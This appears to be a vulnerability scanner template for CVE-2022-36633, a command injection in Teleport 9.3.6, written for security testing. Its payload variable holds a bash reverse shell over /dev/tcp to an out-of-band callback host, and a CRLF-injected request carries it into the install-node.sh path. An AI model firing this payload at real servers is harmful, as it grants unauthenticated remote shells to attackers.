id: CVE-2022-36633

info:
  name: Teleport 9.3.6 Command Injection
  author: dwisiswant0
  severity: high
  description: |
    Teleport 9.3.6 is vulnerable to command injection
    leading to remote code execution. An attacker can
    craft a malicious ssh agent installation link by
    URL encoding a bash escape with carriage return
    line feed. This url encoded payload can be used
    in place of a token and sent to a user in a social
    engineering attack. This is fully unauthenticated
    attack utilizing the trusted teleport server to
    deliver the payload.
  reference:
    - https://github.com/advisories/GHSA-6xf3-5hp7-xqqg
    - https://github.com/gravitational/teleport/pull/14726
  tags: cve,cve2022,teleport,rce

variables:
  payload: "/bin/bash -l > /dev/tcp/{{interactsh-url}}/{{rand_text_numeric(5)}} 0<&1 2>&1 #"

requests:
  - method: GET
    path:
      - "{{BaseURL}}/scripts/%22%0a{{ url_encode(payload) }}/install-node.sh?method=iam"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"